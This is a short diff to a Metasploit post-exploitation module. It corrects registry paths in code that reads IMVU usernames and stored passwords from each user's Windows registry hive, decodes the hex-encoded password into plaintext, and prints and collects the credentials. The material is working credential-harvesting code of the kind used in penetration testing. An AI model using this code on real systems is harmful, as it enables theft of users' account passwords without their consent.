@@ -52,13 +52,13 @@ class MetasploitModule < Msf::Post
       next if hive['HKU'].nil?
 
       vprint_status("Looking at Key #{hive['HKU']}")
-      subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
+      subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU")
       if subkeys.nil? || subkeys.empty?
         print_status('IMVU not installed for this user.')
         next
       end
-      user = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\username\\", '')
-      hpass = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\password\\", '')
+      user = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\username", '')
+      hpass = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\password", '')
       decpass = [ hpass.downcase.gsub(/'/, '').gsub(/\\?x([a-f0-9][a-f0-9])/, '\1') ].pack('H*')
       print_good("User=#{user}, Password=#{decpass}")
       creds << [user, decpass]
